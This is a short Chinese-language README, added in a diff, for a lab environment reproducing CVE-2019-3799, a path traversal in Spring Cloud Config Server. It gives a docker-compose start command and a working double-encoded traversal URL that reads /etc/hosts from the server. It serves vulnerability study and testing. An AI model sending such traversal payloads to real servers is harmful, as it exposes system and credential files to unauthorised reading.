@@ -1,0 +1,22 @@
+## Spring Cloud Config Server 路径穿越与任意文件读取 【CVE-2019-3799】
+
+
+## 测试环境
+
+```
+docker-compose up -d
+```
+环境启动后，访问http://ip:38091
+
+## 漏洞复现
+
+我这里使用的是https://github.com/spring-cloud-samples/config-repo
+
+访问http://loneyer:38091/foo/default/master/logtest.yml
+
+![1.png](1.png)
+
+> http://loneyer:38091/foo/default/master/..%252F..%252F..%252F..%252F..%252F..%252Fetc%252fhosts
+
+![2.png](2.png)
+
